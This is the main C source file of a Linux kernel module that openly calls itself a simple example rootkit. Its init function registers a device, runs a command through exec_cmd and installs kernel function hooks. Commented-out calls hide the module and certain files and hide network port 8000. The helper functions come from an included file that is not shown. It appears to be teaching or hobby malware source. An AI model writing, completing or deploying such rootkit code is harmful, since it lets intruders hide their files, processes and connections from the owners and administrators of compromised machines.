#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/module.h>
#include "functions.c"

// 模块加载、卸载函数定义
static int __init rootkit_init(void)
{
    int err;
    // 模块测试
    module_info();
    register_dev();
    // hide_myself();
    // show_myself();
    // insert_file_node("functions.c");
    // insert_file_node("rootkit");
    // insert_file_node("1584");
    // insert_port_node(8000);
    // delete_port_node(8000);
    // print_port_node();

    exec_cmd("ls");

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        pr_alert("[rootkit_init]:hook error");
    pr_info("[rootkit_init]:Module install successful!!!\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_dev();
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[rootkit_exit]:Module uninstall successful!\n");
}

// 模块信息声明
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ice");
MODULE_DESCRIPTION("A simple example Rootkit.");
MODULE_VERSION("1.0");
module_init(rootkit_init);
module_exit(rootkit_exit);
